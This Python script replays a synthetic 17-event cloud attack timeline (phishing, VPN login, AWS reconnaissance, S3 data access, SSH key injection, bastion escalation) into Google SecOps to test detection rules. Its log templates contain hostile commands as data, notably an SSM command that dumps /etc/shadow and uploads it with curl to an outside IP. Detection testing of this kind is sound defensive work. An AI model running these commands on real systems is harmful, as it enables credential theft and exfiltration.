#!/usr/bin/env python3
"""
Deterministic Case 107625 Replay & Curated Detection Evaluation Script.

This script replays the 17-log multi-stage attack campaign derived from SecOps Case 107625
(API Call Using Third-Party VPN) across Chrome Enterprise, Google Workspace, AWS CloudTrail,
Wiz, and Linux Bastion (NIX_SYSTEM).

Features:
- Deterministic: 100% reproducible execution without requiring LLM calls.
- Time shifting: Generates exact relative offsets based on a user-specified starting/anchor timestamp.
- Modes:
    - 'anchor' (default): Anchor time aligns with the central Wiz alert (pre-incident in past, post-incident in future).
    - 'decreasing': Anchor time represents current time/incident completion; all 17 events are replayed with
                    decreasing timestamps into the past.
    - 'forward': Anchor time represents the initial phishing click; all events progress forward in time.
- Ingestion target: Ingests directly to Google SecOps (Chronicle) via SecOpsSink or exports to JSONL.
"""

import argparse
from datetime import datetime, timedelta, timezone
import json
import os
import sys
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Add logjammer to path if run from repo
REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "src"))

try:
    from logjammer.models import GeneratedScenario, LogEntry
    from logjammer.sinks.secops import SecOpsSink
except ImportError:
    GeneratedScenario = None
    LogEntry = None
    SecOpsSink = None


DEFAULT_CUSTOMER_ID = os.environ.get("SECOPS_CUSTOMER_ID", "YOUR_SECOPS_CUSTOMER_ID")
DEFAULT_PROJECT_ID = os.environ.get("GOOGLE_CLOUD_PROJECT") or os.environ.get("GCP_PROJECT_NUMBER", "YOUR_GCP_PROJECT_ID")
DEFAULT_REGION = "us"
DEFAULT_SCENARIO_TAG = "case107625-curated-demo"

# Relative timeline offsets (in seconds) relative to the central Wiz Alert (T_0 = 0.0)
EVENT_SPECS = [
    {
        "id": "chrome_phish_warn",
        "log_type": "CHROME_MANAGEMENT",
        "offset": -672.9,
        "desc": "Chrome Phishing Navigation Warned (Credential harvest URL)",
        "curated_rule": "ur_346bff4e-e197-41de-a283-71c5d3bce3df (PRECISE)",
        "template": {
            "event": "badNavigationEvent",
            "time": "{epoch_3f}",
            "reason": "SOCIAL_ENGINEERING",
            "result": "EVENT_RESULT_WARNED",
            "device_name": "DESKTOP-TROY-WIZ",
            "device_user": "wizuniversity\\castor.troy",
            "profile_user": "castor.troy@wizuniversity.com",
            "device_id": "8c7a2e01-52b8-4e12-9c98-10283fbc7102",
            "os_platform": "Windows",
            "os_version": "10.0.22631.3007",
            "browser_version": "124.0.6367.91",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "client_type": "CHROME_BROWSER",
            "url": "https://login-verify-account.com/auth?email=castor.troy@wizuniversity.com"
        }
    },
    {
        "id": "chrome_phish_bypass",
        "log_type": "CHROME_MANAGEMENT",
        "offset": -648.7,
        "desc": "Chrome SafeBrowsing Warning Bypassed by User",
        "curated_rule": "ur_2c6c9839-699b-49de-b200-2a15e822f978 (PRECISE)",
        "template": {
            "event": "badNavigationEvent",
            "time": "{epoch_3f}",
            "reason": "SOCIAL_ENGINEERING",
            "result": "EVENT_RESULT_BYPASSED",
            "device_name": "DESKTOP-TROY-WIZ",
            "device_user": "wizuniversity\\castor.troy",
            "profile_user": "castor.troy@wizuniversity.com",
            "device_id": "8c7a2e01-52b8-4e12-9c98-10283fbc7102",
            "os_platform": "Windows",
            "os_version": "10.0.22631.3007",
            "browser_version": "124.0.6367.91",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "client_type": "CHROME_BROWSER",
            "url": "https://login-verify-account.com/auth?email=castor.troy@wizuniversity.com"
        }
    },
    {
        "id": "ws_login_success",
        "log_type": "WORKSPACE_ACTIVITY",
        "offset": -375.0,
        "desc": "Google Workspace Password Authentication from Proton VPN",
        "curated_rule": "ur_01545928-c3ee-41ff-a00d-6869857bb878 (BROAD)",
        "template": {
            "kind": "admin#reports#activity",
            "id": {
                "time": "{iso_ms}",
                "uniqueQualifier": "-5918237461029384711",
                "applicationName": "login",
                "customerId": "C01wizuniv99"
            },
            "etag": "\"WIZ-ETAG-AUTH-90182374/abc123XYZ456-TOKEN\"",
            "actor": {
                "callerType": "USER",
                "email": "castor.troy@wizuniversity.com",
                "profileId": "109283746152019284751"
            },
            "ipAddress": "149.40.62.32",
            "ownerDomain": "wizuniversity.com",
            "events": [
                {
                    "type": "login",
                    "name": "login_success",
                    "parameters": [
                        {"name": "login_type", "value": "google_password"},
                        {"name": "login_challenge_method", "multiValue": ["password"]},
                        {"name": "is_suspicious", "boolValue": True},
                        {"name": "is_second_factor", "boolValue": False}
                    ]
                }
            ]
        }
    },
    {
        "id": "ws_suspicious_login",
        "log_type": "WORKSPACE_ACTIVITY",
        "offset": -374.0,
        "desc": "Google Workspace Account Warning: Suspicious Login Detected",
        "curated_rule": "ur_e5aa91f8-d2bc-4687-8baa-c9cd31ce8506 (Requires Baseline)",
        "template": {
            "kind": "admin#reports#activity",
            "id": {
                "time": "{iso_ms}",
                "uniqueQualifier": "-5918237461029384712",
                "applicationName": "login",
                "customerId": "C01wizuniv99"
            },
            "etag": "\"WIZ-ETAG-AUTH-90182374/def456UVW789-WARN\"",
            "actor": {
                "callerType": "USER",
                "email": "castor.troy@wizuniversity.com",
                "profileId": "109283746152019284751"
            },
            "ipAddress": "149.40.62.32",
            "ownerDomain": "wizuniversity.com",
            "events": [
                {
                    "type": "account_warning",
                    "name": "suspicious_login",
                    "parameters": [
                        {"name": "affected_email_address", "value": "castor.troy@wizuniversity.com"},
                        {"name": "is_suspicious", "boolValue": True}
                    ]
                }
            ]
        }
    },
    {
        "id": "ws_saml_sso",
        "log_type": "WORKSPACE_ACTIVITY",
        "offset": -345.0,
        "desc": "Google Workspace SAML SSO Token Issuance for AWS Access",
        "curated_rule": "Workspace Cloud Federation Activity",
        "template": {
            "kind": "admin#reports#activity",
            "id": {
                "time": "{iso_ms}",
                "uniqueQualifier": "-5918237461029384715",
                "applicationName": "saml",
                "customerId": "C01wizuniv99"
            },
            "etag": "\"WIZ-ETAG-AUTH-90182374/saml987654321-SSO\"",
            "actor": {
                "callerType": "USER",
                "email": "castor.troy@wizuniversity.com",
                "profileId": "109283746152019284751"
            },
            "ipAddress": "149.40.62.32",
            "ownerDomain": "wizuniversity.com",
            "events": [
                {
                    "type": "login",
                    "name": "login_success",
                    "parameters": [
                        {"name": "application_name", "value": "Amazon Web Services"},
                        {"name": "initiated_by", "value": "sp"},
                        {"name": "saml_status_code", "value": "SUCCESS"}
                    ]
                }
            ]
        }
    },
    {
        "id": "aws_sts_get_caller_identity",
        "log_type": "AWS_CLOUDTRAIL",
        "offset": -60.0,
        "desc": "AWS STS GetCallerIdentity Reconnaissance (Pacu User Agent)",
        "curated_rule": "ur_88ca7693-4901-470f-b7f5-32c968d6127d (PRECISE)",
        "template": {
            "Records": [
                {
                    "eventVersion": "1.08",
                    "userIdentity": {
                        "type": "IAMUser",
                        "principalId": "AIDAJZ76XAMPLEWIZUSER",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                        "accountId": "498752334630",
                        "userName": "castor.troy@wizuniversity.com",
                        "accessKeyId": "AKIA0000000000EXAMPLE"
                    },
                    "eventTime": "{iso_ms}",
                    "eventSource": "sts.amazonaws.com",
                    "eventName": "GetCallerIdentity",
                    "awsRegion": "us-east-2",
                    "sourceIPAddress": "149.40.62.32",
                    "userAgent": "Pacu/v1.0.0",
                    "requestParameters": None,
                    "responseElements": {
                        "userId": "AIDAJZ76XAMPLEWIZUSER",
                        "account": "498752334630",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com"
                    },
                    "requestID": "a1b2c3d4-0011-4f91-88ae-4f18dbfa6b91",
                    "eventID": "e871b69a-87c2-49da-9c88-29177a64ce19",
                    "readOnly": True,
                    "eventType": "AwsApiCall",
                    "managementEvent": True,
                    "recipientAccountId": "498752334630",
                    "eventCategory": "Management"
                }
            ]
        }
    },
    {
        "id": "wiz_vpn_alert",
        "log_type": "WIZ_IO",
        "offset": 0.0,
        "desc": "Wiz Detection Alert: API Call Using Third-Party VPN (Case 107625 Anchor)",
        "curated_rule": "ur_64eb44ed-12d6-428a-b14e-0a680adeed56 / ur_e4892787-f239-4d41-bb0f-740436a9019b",
        "template": {
            "trigger": {
                "source": "DETECTIONS",
                "type": "Created",
                "ruleId": "7d87df03-723b-4c00-af75-f89a1d5ef788",
                "ruleName": "API Call Using Third-Party VPN",
                "updatedFields": " status field was changed from null to OPEN,  severity field was changed from null to MEDIUM, ",
                "changedBy": "Wiz"
            },
            "issue": {
                "id": "7d87df03-723b-4c00-af75-f89a1d5ef788",
                "status": "OPEN",
                "severity": "MEDIUM",
                "created": "{iso_ms}",
                "projects": "wizwashers-prod-68c252-connector"
            },
            "resource": {
                "id": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                "name": "castor.troy@wizuniversity.com",
                "type": "iam#user",
                "cloudPlatform": "AWS",
                "subscriptionId": "498752334630",
                "subscriptionName": "wizwashers-prod-68c252-connector",
                "region": "us-east-2",
                "status": "Active",
                "cloudProviderURL": "https://console.aws.amazon.com/iam/home#/users/castor.troy@wizuniversity.com"
            },
            "control": {
                "id": "wc-id-vpn-sts-recon-49875",
                "name": "API Call Using Third-Party VPN",
                "description": "A GetCallerIdentity API operation was initiated against sts.amazonaws.com by AWS IAM user castor.troy@wizuniversity.com from a known third-party VPN IP address (149.40.62.32, Proton VPN / Datacamp Limited). Legitimate administrative access to AWS resources typically originates from corporate networks.",
                "severity": "MEDIUM",
                "IssueURL": "https://app.wiz.io/issues#~(issue~'7d87df03-723b-4c00-af75-f89a1d5ef788')",
                "risks": ["UNAUTHORIZED_REMOTE_ACCESS", "CREDENTIAL_COMPROMISE"]
            }
        }
    },
    {
        "id": "aws_iam_list_attached_policies",
        "log_type": "AWS_CLOUDTRAIL",
        "offset": 105.0,
        "desc": "AWS IAM ListAttachedUserPolicies Discovery (Pacu)",
        "curated_rule": "ur_88ca7693-4901-470f-b7f5-32c968d6127d (PRECISE) & ur_2eba66e2 (BROAD)",
        "template": {
            "Records": [
                {
                    "eventVersion": "1.08",
                    "userIdentity": {
                        "type": "IAMUser",
                        "principalId": "AIDAJZ76XAMPLEWIZUSER",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                        "accountId": "498752334630",
                        "userName": "castor.troy@wizuniversity.com",
                        "accessKeyId": "AKIA0000000000EXAMPLE"
                    },
                    "eventTime": "{iso_ms}",
                    "eventSource": "iam.amazonaws.com",
                    "eventName": "ListAttachedUserPolicies",
                    "awsRegion": "us-east-2",
                    "sourceIPAddress": "149.40.62.32",
                    "userAgent": "Pacu/v1.0.0",
                    "requestParameters": {"userName": "castor.troy@wizuniversity.com"},
                    "responseElements": None,
                    "requestID": "b2c3d4e5-0022-4a11-99bf-5f29ecab7c02",
                    "eventID": "f982c70b-98d3-4aeb-ad99-30288b75df20",
                    "readOnly": True,
                    "eventType": "AwsApiCall",
                    "managementEvent": True,
                    "recipientAccountId": "498752334630",
                    "eventCategory": "Management"
                }
            ]
        }
    },
    {
        "id": "aws_s3_list_objects",
        "log_type": "AWS_CLOUDTRAIL",
        "offset": 270.0,
        "desc": "AWS S3 Sensitive Bucket Enumeration ListObjectsV2 (Cloudfox)",
        "curated_rule": "ur_88ca7693-4901-470f-b7f5-32c968d6127d (PRECISE)",
        "template": {
            "Records": [
                {
                    "eventVersion": "1.08",
                    "userIdentity": {
                        "type": "IAMUser",
                        "principalId": "AIDAJZ76XAMPLEWIZUSER",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                        "accountId": "498752334630",
                        "userName": "castor.troy@wizuniversity.com",
                        "accessKeyId": "AKIA0000000000EXAMPLE"
                    },
                    "eventTime": "{iso_ms}",
                    "eventSource": "s3.amazonaws.com",
                    "eventName": "ListObjectsV2",
                    "awsRegion": "us-east-2",
                    "sourceIPAddress": "149.40.62.32",
                    "userAgent": "Cloudfox/v1.11.0",
                    "requestParameters": {
                        "bucketName": "sc88-68c252-sensitive-customer-data-us-east-2",
                        "prefix": "customer_pii"
                    },
                    "responseElements": None,
                    "requestID": "C3D4E5F6A7B8C9D0",
                    "eventID": "0a1b2c3d-4e5f-6a7b-8c9d-0e1f2a3b4c5d",
                    "readOnly": True,
                    "eventType": "AwsApiCall",
                    "managementEvent": False,
                    "recipientAccountId": "498752334630",
                    "eventCategory": "Data"
                }
            ]
        }
    },
    {
        "id": "aws_s3_get_object",
        "log_type": "AWS_CLOUDTRAIL",
        "offset": 420.0,
        "desc": "AWS S3 Customer PII Exfiltration GetObject (Cloudfox)",
        "curated_rule": "ur_88ca7693-4901-470f-b7f5-32c968d6127d (PRECISE)",
        "template": {
            "Records": [
                {
                    "eventVersion": "1.08",
                    "userIdentity": {
                        "type": "IAMUser",
                        "principalId": "AIDAJZ76XAMPLEWIZUSER",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                        "accountId": "498752334630",
                        "userName": "castor.troy@wizuniversity.com",
                        "accessKeyId": "AKIA0000000000EXAMPLE"
                    },
                    "eventTime": "{iso_ms}",
                    "eventSource": "s3.amazonaws.com",
                    "eventName": "GetObject",
                    "awsRegion": "us-east-2",
                    "sourceIPAddress": "149.40.62.32",
                    "userAgent": "Cloudfox/v1.11.0",
                    "requestParameters": {
                        "bucketName": "sc88-68c252-sensitive-customer-data-us-east-2",
                        "key": "customer_pii_export_2026.csv.enc"
                    },
                    "responseElements": None,
                    "resources": [
                        {
                            "type": "AWS::S3::Object",
                            "ARN": "arn:aws:s3:::sc88-68c252-sensitive-customer-data-us-east-2/customer_pii_export_2026.csv.enc"
                        },
                        {
                            "accountId": "498752334630",
                            "type": "AWS::S3::Bucket",
                            "ARN": "arn:aws:s3:::sc88-68c252-sensitive-customer-data-us-east-2"
                        }
                    ],
                    "requestID": "D4E5F6A7B8C9D0E1",
                    "eventID": "1b2c3d4e-5f6a-7b8c-9d0e-1f2a3b4c5d6e",
                    "readOnly": True,
                    "eventType": "AwsApiCall",
                    "managementEvent": False,
                    "recipientAccountId": "498752334630",
                    "eventCategory": "Data"
                }
            ]
        }
    },
    {
        "id": "aws_ssh_send_public_key",
        "log_type": "AWS_CLOUDTRAIL",
        "offset": 650.0,
        "desc": "AWS EC2 Instance Connect SendSSHPublicKey Injection (Pacu)",
        "curated_rule": "ur_88ca7693-4901-470f-b7f5-32c968d6127d (PRECISE) & ur_af32dc0d (BROAD)",
        "template": {
            "Records": [
                {
                    "eventVersion": "1.08",
                    "userIdentity": {
                        "type": "IAMUser",
                        "principalId": "AIDAJZ76XAMPLEWIZUSER",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                        "accountId": "498752334630",
                        "userName": "castor.troy@wizuniversity.com",
                        "accessKeyId": "AKIA0000000000EXAMPLE"
                    },
                    "eventTime": "{iso_ms}",
                    "eventSource": "ec2-instance-connect.amazonaws.com",
                    "eventName": "SendSSHPublicKey",
                    "awsRegion": "us-east-2",
                    "sourceIPAddress": "149.40.62.32",
                    "userAgent": "Pacu/v1.0.0",
                    "requestParameters": {
                        "instanceId": "i-0ac88c252bastion",
                        "instanceOSUser": "ec2-user",
                        "sSHPublicKey": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... castor@attacker-vpn"
                    },
                    "responseElements": {
                        "requestId": "e1f2a3b4-5c6d-7e8f-9a0b-1c2d3e4f5a6b",
                        "success": True
                    },
                    "resources": [
                        {
                            "ARN": "arn:aws:ec2:us-east-2:498752334630:instance/i-0ac88c252bastion",
                            "accountId": "498752334630",
                            "type": "AWS::EC2::Instance"
                        }
                    ],
                    "requestID": "e1f2a3b4-5c6d-7e8f-9a0b-1c2d3e4f5a6b",
                    "eventID": "2c3d4e5f-6a7b-8c9d-0e1f-2a3b4c5d6e7f",
                    "readOnly": False,
                    "eventType": "AwsApiCall",
                    "managementEvent": True,
                    "recipientAccountId": "498752334630",
                    "eventCategory": "Management"
                }
            ]
        }
    },
    {
        "id": "nix_ssh_accepted",
        "log_type": "NIX_SYSTEM",
        "offset": 679.0,
        "desc": "Linux Bastion SSH Public Key Authentication Accepted from VPN IP",
        "curated_rule": "Bastion Authentication Telemetry",
        "raw_template": "<86>{syslog_ts} sc88-68c252-bastion-to-prod sshd[14820]: Accepted publickey for ec2-user from 149.40.62.32 port 49182 ssh2: RSA SHA256:K3m7FqV4hU2x0s0Pn9w1zL3Y7tI5bV6cX8j9D1E2F3G"
    },
    {
        "id": "nix_ssh_opened",
        "log_type": "NIX_SYSTEM",
        "offset": 679.0,
        "desc": "Linux Bastion PAM Session Opened for ec2-user",
        "curated_rule": "Session Management Telemetry",
        "raw_template": "<86>{syslog_ts} sc88-68c252-bastion-to-prod sshd[14820]: pam_unix(sshd:session): session opened for user ec2-user by (uid=0)"
    },
    {
        "id": "nix_sudo_shadow",
        "log_type": "NIX_SYSTEM",
        "offset": 824.0,
        "desc": "Linux Bastion Privilege Escalation: sudo cat /etc/shadow",
        "curated_rule": "Privilege Escalation / Credential Access Telemetry",
        "raw_template": "<86>{syslog_ts} sc88-68c252-bastion-to-prod sudo[14902]:   ec2-user : TTY=pts/0 ; PWD=/home/ec2-user ; USER=root ; COMMAND=/bin/cat /etc/shadow"
    },
    {
        "id": "nix_sudo_netstat",
        "log_type": "NIX_SYSTEM",
        "offset": 869.0,
        "desc": "Linux Bastion Internal Network Discovery: sudo ss -tulnp",
        "curated_rule": "Local System & Network Discovery Telemetry",
        "raw_template": "<86>{syslog_ts} sc88-68c252-bastion-to-prod sudo[14925]:   ec2-user : TTY=pts/0 ; PWD=/home/ec2-user ; USER=root ; COMMAND=/usr/bin/ss -tulnp"
    },
    {
        "id": "aws_ssm_send_command",
        "log_type": "AWS_CLOUDTRAIL",
        "offset": 915.0,
        "desc": "AWS SSM SendCommand Lateral Remote Command Execution (Pacu)",
        "curated_rule": "ur_88ca7693-4901-470f-b7f5-32c968d6127d (PRECISE)",
        "template": {
            "Records": [
                {
                    "eventVersion": "1.08",
                    "userIdentity": {
                        "type": "IAMUser",
                        "principalId": "AIDAJZ76XAMPLEWIZUSER",
                        "arn": "arn:aws:iam::498752334630:user/castor.troy@wizuniversity.com",
                        "accountId": "498752334630",
                        "userName": "castor.troy@wizuniversity.com",
                        "accessKeyId": "AKIA0000000000EXAMPLE"
                    },
                    "eventTime": "{iso_ms}",
                    "eventSource": "ssm.amazonaws.com",
                    "eventName": "SendCommand",
                    "awsRegion": "us-east-2",
                    "sourceIPAddress": "149.40.62.32",
                    "userAgent": "Pacu/v1.0.0",
                    "requestParameters": {
                        "documentName": "AWS-RunShellScript",
                        "instanceIds": ["i-0ac88c252bastion"],
                        "parameters": {
                            "commands": ["cat /etc/shadow > /tmp/.dump && curl -T /tmp/.dump http://149.40.62.32:8000/loot"]
                        }
                    },
                    "responseElements": {
                        "command": {
                            "commandId": "7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d",
                            "documentName": "AWS-RunShellScript",
                            "status": "Pending"
                        }
                    },
                    "requestID": "f2a3b4c5-6d7e-8f9a-0b1c-2d3e4f5a6b7c",
                    "eventID": "3d4e5f6a-7b8c-9d0e-1f2a-3b4c5d6e7f8a",
                    "readOnly": False,
                    "eventType": "AwsApiCall",
                    "managementEvent": True,
                    "recipientAccountId": "498752334630",
                    "eventCategory": "Management"
                }
            ]
        }
    },
    {
        "id": "nix_ssh_closed",
        "log_type": "NIX_SYSTEM",
        "offset": 1129.0,
        "desc": "Linux Bastion PAM Session Closed (Attack Cleanup / Exit)",
        "curated_rule": "Session Management Telemetry",
        "raw_template": "<86>{syslog_ts} sc88-68c252-bastion-to-prod sshd[14820]: pam_unix(sshd:session): session closed for user ec2-user"
    }
]


def format_syslog_timestamp(dt: datetime) -> str:
    """Formats datetime according to standard RFC 3164 Syslog (e.g. 'Oct 21 09:15:30')."""
    return f"{dt.strftime('%b')} {dt.day:2d} {dt.strftime('%H:%M:%S')}"


def format_iso_timestamp(dt: datetime) -> str:
    """Formats datetime according to standard ISO 8601 UTC with milliseconds."""
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def compute_event_timestamps(
    base_time: datetime,
    mode: str = "anchor"
) -> List[Tuple[datetime, Dict[str, Any]]]:
    """
    Computes absolute timestamps for each event spec based on the mode.

    Modes:
      - 'anchor': base_time is the central Wiz alert (T_0 = 0.0s). Pre-incident is before, post-incident after.
      - 'decreasing': base_time is the conclusion of the attack (end time / now); events stretch back into the past.
      - 'forward': base_time is the first initial access event; events progress forward in time.
    """
    results = []
    offsets = [s["offset"] for s in EVENT_SPECS]
    min_off = min(offsets)  # -672.9s (~ -11.2 min)
    max_off = max(offsets)  # 1129.0s (~ +18.8 min)

    for spec in EVENT_SPECS:
        raw_off = spec["offset"]
        if mode == "decreasing":
            # Conclusion at base_time: event_offset = raw_off - max_off (all <= 0)
            delta_sec = raw_off - max_off
        elif mode == "forward":
            # Start at base_time: event_offset = raw_off - min_off (all >= 0)
            delta_sec = raw_off - min_off
        else:  # 'anchor'
            delta_sec = raw_off

        ev_dt = base_time + timedelta(seconds=delta_sec)
        results.append((ev_dt, spec))

    results.sort(key=lambda x: x[0])
    return results


def render_event_content(ev_dt: datetime, spec: Dict[str, Any]) -> str:
    """Renders the exact log payload string with properly formatted timestamps."""
    iso_ms = format_iso_timestamp(ev_dt)
    epoch_3f = f"{ev_dt.timestamp():.3f}"
    syslog_ts = format_syslog_timestamp(ev_dt)

    if spec["log_type"] == "NIX_SYSTEM":
        return spec["raw_template"].format(syslog_ts=syslog_ts)

    # For JSON templates: deep copy / serialize
    def _replace_recursive(obj: Any) -> Any:
        if isinstance(obj, str):
            return obj.replace("{iso_ms}", iso_ms).replace("{epoch_3f}", epoch_3f)
        elif isinstance(obj, list):
            return [_replace_recursive(x) for x in obj]
        elif isinstance(obj, dict):
            return {k: _replace_recursive(v) for k, v in obj.items()}
        return obj

    rendered_dict = _replace_recursive(spec["template"])
    return json.dumps(rendered_dict, separators=(",", ":"))


def build_scenario_payload(
    base_time: datetime,
    mode: str = "anchor"
) -> Dict[str, List[Dict[str, Any]]]:
    """Builds dictionary of log_type -> list of log records with rendered content and timestamps."""
    events = compute_event_timestamps(base_time, mode)
    logs_by_type: Dict[str, List[Dict[str, Any]]] = {}

    for ev_dt, spec in events:
        content = render_event_content(ev_dt, spec)
        lt = spec["log_type"]
        entry = {
            "id": spec["id"],
            "log_type": lt,
            "timestamp": ev_dt.isoformat(),
            "description": spec["desc"],
            "curated_rule": spec["curated_rule"],
            "content": content
        }
        logs_by_type.setdefault(lt, []).append(entry)

    return logs_by_type


def print_timeline_summary(events: List[Tuple[datetime, Dict[str, Any]]], base_time: datetime, mode: str):
    """Prints a formatted ASCII summary of the replayed timeline."""
    print(f"\n==========================================================================================")
    print(f"  CASE 107625 DETERMINISTIC ATTACK CAMPAIGN TIMELINE")
    print(f"  Mode: {mode.upper()} | Reference Time: {base_time.isoformat()}")
    print(f"==========================================================================================")
    print(f"{'Offset':^10} | {'Timestamp (UTC)':^24} | {'Log Type':^19} | {'Description / Curated Rule'}")
    print(f"{'-'*10}-|-{'-'*24}-|-{'-'*19}-|-{'-'*45}")

    for ev_dt, spec in events:
        diff_sec = (ev_dt - base_time).total_seconds()
        sign = "+" if diff_sec >= 0 else "-"
        m, s = divmod(abs(int(diff_sec)), 60)
        off_str = f"{sign}{m:02d}m{s:02d}s"
        lt = spec["log_type"]
        desc = spec["desc"]
        rule = spec["curated_rule"]
        print(f"{off_str:^10} | {ev_dt.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]:^24} | {lt:19} | {desc}")
        print(f"{'':10} | {'':24} | {'':19} |   -> Trigger: {rule}")

    print(f"==========================================================================================\n")


def main():
    parser = argparse.ArgumentParser(
        description="Deterministic Replay Script for Case 107625 and Curated Detections."
    )
    parser.add_argument(
        "--start-time",
        "--anchor-time",
        dest="start_time",
        default="now",
        help="ISO 8601 starting timestamp (e.g. '2026-10-21T09:00:00Z' or 'now'). Defaults to current UTC time.",
    )
    parser.add_argument(
        "--mode",
        choices=["anchor", "decreasing", "forward"],
        default="anchor",
        help="Timeline alignment mode: 'anchor' (Wiz alert at T_0), 'decreasing' (end at start_time, past decreasing), or 'forward' (start at start_time).",
    )
    parser.add_argument(
        "--output",
        "-o",
        default=f"secops://{DEFAULT_CUSTOMER_ID}",
        help=f"Destination: 'secops://<CUSTOMER_ID>' or local file path (.jsonl/.json). Defaults to tenant SecOps instance.",
    )
    parser.add_argument(
        "--project",
        "-p",
        default=DEFAULT_PROJECT_ID,
        help=f"Google Cloud Project Number or ID (default: {DEFAULT_PROJECT_ID}).",
    )
    parser.add_argument(
        "--region",
        "-r",
        default=DEFAULT_REGION,
        help=f"Chronicle region (default: {DEFAULT_REGION}).",
    )
    parser.add_argument(
        "--case-id",
        dest="case_id",
        default="107625",
        help="Target Case ID being simulated/replayed (default: 107625).",
    )
    parser.add_argument(
        "--tag",
        "--scenario-tag",
        dest="tag",
        default=None,
        help="Scenario tag applied to ingestion labels (default: case<CASE_ID>-curated-demo).",
    )
    parser.add_argument(
        "--label",
        "-l",
        action="append",
        help="Custom key=value ingestion label pair (can be specified multiple times).",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Compute and display the timeline and log entries without transmitting to Chronicle.",
    )

    args = parser.parse_args()

    # Resolve base timestamp
    st = args.start_time.strip()
    if st.lower() in ("now", "current"):
        base_time = datetime.now(timezone.utc)
    else:
        try:
            base_time = datetime.fromisoformat(st.replace("Z", "+00:00"))
        except ValueError as e:
            print(f"[Error] Invalid ISO 8601 datetime format for --start-time: '{args.start_time}' ({e})", file=sys.stderr)
            sys.exit(1)

    events = compute_event_timestamps(base_time, args.mode)
    print_timeline_summary(events, base_time, args.mode)

    # Prepare logs
    logs_by_type = build_scenario_payload(base_time, args.mode)
    total_logs = sum(len(v) for v in logs_by_type.values())

    scenario_tag = args.tag if args.tag else f"case{args.case_id}-curated-demo"
    labels_dict = {
        "SOURCE": "LOGJAMMER",
        "SCENARIO_TAG": scenario_tag,
        "ORIGINAL_CASE": str(args.case_id)
    }
    if args.label:
        for item in args.label:
            if "=" in item:
                k, v = item.split("=", 1)
                labels_dict[k.strip()] = v.strip()

    if args.dry_run:
        print(f"[Dry Run] Generated {total_logs} logs across {len(logs_by_type)} log types.")
        print(f"[Dry Run] Target Destination: {args.output}")
        print(f"[Dry Run] Ingestion Labels: {labels_dict}")
        return

    # Check output type
    dest = args.output.strip()
    if dest.startswith("secops://") or dest.startswith("chronicle://"):
        if not SecOpsSink or not GeneratedScenario or not LogEntry:
            print("[Error] LogJammer core dependencies not found. Please install logjammer dependencies.", file=sys.stderr)
            sys.exit(1)

        customer_id = dest.replace("secops://", "").replace("chronicle://", "").split("@")[0].strip() or DEFAULT_CUSTOMER_ID

        print(f"[*] Connecting to Google SecOps (Customer: {customer_id}, Region: {args.region}, Project: {args.project})...")
        sink = SecOpsSink(
            customer_id=customer_id,
            project_number=args.project,
            region=args.region,
            labels=labels_dict,
            tag=scenario_tag,
            scenario_name=scenario_tag,
        )

        scenario_logs: Dict[str, List[LogEntry]] = {}
        for lt, entries in logs_by_type.items():
            scenario_logs[lt] = [
                LogEntry(
                    log_type=lt,
                    content=e["content"],
                    timestamp=datetime.fromisoformat(e["timestamp"]),
                    format="json" if lt != "NIX_SYSTEM" else "syslog"
                )
                for e in entries
            ]

        scenario = GeneratedScenario(
            title=f"Case 107625 Replay ({args.mode})",
            description="Compromised IAM Identity via Third-Party VPN to Cloud Exfiltration and Bastion Lateral Movement",
            logs=scenario_logs,
        )

        print(f"[*] Ingesting {total_logs} logs directly into Chronicle SIEM via logs:import...")
        count = sink.emit(scenario)
        print(f"[✓] Successfully replayed {count} logs to Google SecOps.")
        if sink.last_export_metadata:
            meta = sink.last_export_metadata
            scen_id = meta.get("scenario_id", "")[:8]
            print(f"[*] Replay Run ID: {scen_id}")
            print(f"[*] UDM Query: {meta.get('udm_query')}")
        print(f"[*] Ingestion Labels: {labels_dict}")
        print(f"[*] Expected Curated Detection Alerts (evaluating within Chronicle pipeline):")
        print(f"    - ur_346bff4e-e197-41de-a283-71c5d3bce3df (Phishing Navigation Event in Chrome - PRECISE)")
        print(f"    - ur_2c6c9839-699b-49de-b200-2a15e822f978 (Safebrowsing Warning Bypassed - PRECISE)")
        print(f"    - ur_88ca7693-4901-470f-b7f5-32c968d6127d (AWS Offsec User Agent Activity - PRECISE)")
        print(f"    - ur_2eba66e2-f7e3-4e9f-9ca2-70486a6a5d39 (Aws Discovery Iam Listattacheduserpolicies - BROAD)")
        print(f"    - ur_01545928-c3ee-41ff-a00d-6869857bb878 (Gw Login Success - BROAD)")
        print(f"    - ur_af32dc0d-cb60-40d0-b62b-dcf1c04a7547 (Aws Sendsshpublickey - BROAD)")

    elif dest.endswith(".jsonl"):
        out_path = Path(dest)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            for lt, entries in logs_by_type.items():
                for e in entries:
                    f.write(json.dumps(e) + "\n")
        print(f"[✓] Exported {total_logs} logs in JSONL format to: {out_path}")

    else:
        out_path = Path(dest)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump({
                "scenario_title": f"Case 107625 Replay ({args.mode})",
                "reference_time": base_time.isoformat(),
                "mode": args.mode,
                "labels": labels_dict,
                "logs": logs_by_type
            }, f, indent=2)
